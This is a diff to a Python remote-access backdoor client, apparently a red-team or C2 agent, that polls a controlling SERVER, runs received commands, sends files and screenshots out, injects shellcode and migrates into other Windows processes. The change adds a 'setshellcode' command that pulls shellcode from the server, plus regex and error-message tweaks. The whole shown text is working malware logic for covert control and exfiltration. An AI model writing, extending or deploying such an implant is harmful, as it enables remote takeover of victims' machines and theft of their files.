@@ -1,8 +1,8 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 __author__      = 'Christophoros Petrou (game0ver)'
-__version__     = '1.4'
+__version__     = '1.5'
 
 import os
 import re
@@ -34,13 +34,13 @@ from requests import Session
 from requests.exceptions import *
 warnings.filterwarnings("ignore")
 
-special_commands = ["upload", "download"]
-chg_dir    = re.compile(r'^cd (.*)$')
+special_commands = ["upload", "download", "setshellcode"]
+chg_dir    = re.compile(r'^\s*cd (.*)$')
 unix_path  = re.compile(r'^(.+/)*([^/]+)$')
 wind_path  = re.compile(r'^(.+\\)*([^/]+)$')
-screenshot = re.compile(r'^screenshot\s*$')
-migrate    = re.compile(r'^migrate\s+(\d+)\s*$')
-inject     = re.compile(r'^inject\s+shellcode\s*$')
+screenshot = re.compile(r'^\s*screenshot\s*$')
+migrate    = re.compile(r'^\s*migrate\s+(\d+)\s*$')
+inject     = re.compile(r'^\s*inject\s+shellcode\s*$')
 
 # windows only
 PAGE_EXECUTE_READWRITE = 0x00000040
@@ -253,7 +253,7 @@ try:
                                 "Action"   : 'upload'
                             },
                         data='Upload Successful!')
-                else:
+                elif 'download' in res.url:
                     filepath = bdec(str(unquote(res.url.split('/')[-1]))).decode("utf-8")
                     if valid_file(filepath):
                         with open(filepath, 'rb') as f:
@@ -270,6 +270,14 @@ try:
                             data=file_contents)
                     else:
                         s.post(SERVER, data='ERROR: File does not exist or is not readable!')
+                else:
+                    shl_id = res.url.split('/')[-1]
+                    shellcode = res.content
+                    s.post(SERVER,
+                        headers={
+                            "Shellcode_id": shl_id
+                        },
+                    data=f"{shl_id}")
             else:
                 cmd = res.text
                 if cmd:
@@ -285,7 +293,9 @@ try:
                             os.chdir(directory)
                             _headers['directory'] =  current_dir(os.getcwd())
                         except OSError as dir_error:
-                            s.post(SERVER, data=dir_error)
+                            s.post(SERVER, data="ERROR: {}".format(dir_error))
+                        except Exception as error:
+                            s.post(SERVER, data="ERROR: {}".format(error))
                     elif screenshot.match(cmd):
                         try:
                             from PIL import ImageGrab
@@ -305,7 +315,7 @@ try:
                             else:
                                 exec_cmd('rm {}'.format(screenshot_name))
                         except ImportError:
-                            s.post(SERVER, data='ERROR: Pillow module is not installed')
+                            s.post(SERVER, data='ERROR: Pillow module is not installed.')
                         except Exception as screenshot_error:
                             s.post(SERVER, data=str(screenshot_error))
                     elif inject.match(cmd):
@@ -319,7 +329,7 @@ try:
                                     t.start()
                                     time.sleep(1)
                                 else:
-                                    s.post(SERVER, data='No shellcode specified...')
+                                    s.post(SERVER, data='No shellcode specified....')
                             else:
                                 s.post(SERVER,
                                     data='For now "inject shellcode" command is available only for 32bit-windows systems.'
@@ -343,7 +353,7 @@ try:
                                 res = migrate_to_pid(pid)
                                 s.post(SERVER, data=migrate_res(pid, res))
                             else:
-                                s.post(SERVER, data='No shellcode specified...')
+                                s.post(SERVER, data='No shellcode specified....')
                         else:
                             s.post(SERVER,
                                 data='For now "migrate" command is available only for x86 & x64 windows systems.'
